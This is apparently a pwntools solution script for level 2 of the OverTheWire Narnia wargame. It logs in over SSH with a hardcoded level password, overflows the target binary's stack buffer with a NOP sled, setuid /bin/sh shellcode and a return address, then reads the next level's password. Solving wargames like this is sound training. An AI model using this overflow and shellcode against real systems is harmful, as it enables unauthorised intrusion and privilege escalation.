#!/usr/bin/env python2
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter

level = 2
user = 'narnia%s' % level
host = 'narnia.labs.overthewire.org'
password = 'nairiepecu'
port = 2226
binary = "/narnia/%s" % user

def connectToLevel():
    return ssh(user=user, host=host, port=port, password=password)

def getPass(shell):
    shell.sendline('cat /etc/narnia_pass/narnia%s' % (level+1))
    flag = shell.recvuntil('$').split()[0]
    log.info('Flag = %s' % flag)
    shell.close()
    return flag

def makeBuffer():

    addr = p32(0xffffddd0)
    shellcode='\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x89\xc2\x31\xc0\xb0\xa4\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
    buf = '\x90' * 97 + shellcode + addr
    return buf

context(arch='i386', os='linux')
shellcode = makeBuffer()
sh = connectToLevel()
exe = sh.process([binary, shellcode])
exe.recvuntil('$')
flag = getPass(exe)
